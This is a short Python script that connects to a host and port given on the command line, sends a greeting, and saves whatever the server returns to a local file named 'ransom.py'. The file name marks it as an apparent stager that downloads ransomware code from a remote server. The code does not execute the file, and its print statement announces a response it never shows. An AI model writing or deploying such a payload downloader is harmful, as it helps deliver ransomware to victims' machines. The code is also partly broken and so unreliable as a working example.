import socket
import sys
def send_tcp_request(host, port):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        client_socket.connect((host, port))
        
        message = "Hello, server!"
        client_socket.sendall(message.encode())
        
        response = client_socket.recv(1024)
        print("Received response from server:")
        with open('ransom.py', 'wb') as f:
            f.write(response)
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()

if __name__ == "__main__":
    host = sys.argv[1]                    
    port = int(sys.argv[2])
    send_tcp_request(host, port)
